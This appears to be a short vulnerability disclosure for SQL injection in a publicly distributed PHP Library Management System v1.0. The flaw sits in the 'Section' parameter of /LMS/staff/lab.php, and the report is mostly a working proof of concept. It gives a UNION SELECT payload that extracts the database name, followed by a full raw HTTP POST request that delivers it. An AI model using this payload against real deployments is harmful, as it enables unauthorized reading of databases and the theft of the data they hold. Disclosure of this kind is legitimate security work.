# Library Management System v1.0 by kingbhob02 has SQL injection

vendors: https://www.sourcecodester.com/php/15434/library-management-system-qr-code-attendance-and-auto-generate-library-card.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /LMS/staff/lab.php

Vulnerability location:  /LMS/staff/lab.php?Section=, Section

[+] Payload: submit=1&Section=-1'%20union%20select%201,2,database(),4,5,6,7,8,9,10--%20&Status=1 // Leak place ---> Section

```sql
POST /LMS/staff/lab.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=7v8p4p3goshl3b4fkncu3bh9ui
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 83

submit=1&Section=-1'%20union%20select%201,2,database(),4,5,6,7,8,9,10--%20&Status=1
```

![image](https://user-images.githubusercontent.com/54017627/180444921-90adb40c-e4b1-45b7-88a9-f3bf4064f5fe.png)
